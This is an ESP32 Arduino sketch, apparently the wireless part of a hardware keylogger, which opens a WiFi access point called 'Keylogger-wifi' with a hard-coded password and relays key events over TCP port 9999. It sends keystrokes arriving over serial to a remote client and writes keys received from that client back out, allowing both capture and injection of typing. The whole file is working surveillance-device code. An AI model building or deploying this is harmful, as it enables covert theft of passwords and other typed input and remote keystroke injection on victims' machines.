#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>

const char *ssid     = "Keylogger-wifi";
const char *password = "Azerty1234";

#define RXD1 16
#define TXD1 17

WiFiServer server(9999);

struct send_char_t {
  int mod;
  char ch;
};

void setup() {
  Serial1.begin(115200, SERIAL_8N1, RXD1, TXD1);
  Serial1.setTimeout(50);

  if (!WiFi.softAP(ssid, password)) {
    log_e("Soft AP creation failed.");
    while(1);
  }
  IPAddress myIP = WiFi.softAPIP();
  server.begin();
}

void loop() {
  struct send_char_t key;

  WiFiClient client = server.available(); // listen for incoming clients
  if (client) {
    while (client.connected()) {
      if (client.available()) { // attend que le client envoye un caractere
        client.readBytes((char*)&key, sizeof(struct send_char_t));
        Serial1.write((char*)&key, sizeof(struct send_char_t));
      }
      if (Serial1.available()) {
        Serial1.readBytes((char*)&key, sizeof(struct send_char_t));
        client.write((char*)&key, sizeof(struct send_char_t));
        Serial1.write((char*)&key, sizeof(struct send_char_t));
      }
    }
    client.stop();
  }
  if (Serial1.available()) {
    Serial1.readBytes((char*)&key, sizeof(struct send_char_t));
    Serial1.write((char*)&key, sizeof(struct send_char_t));
  }
}
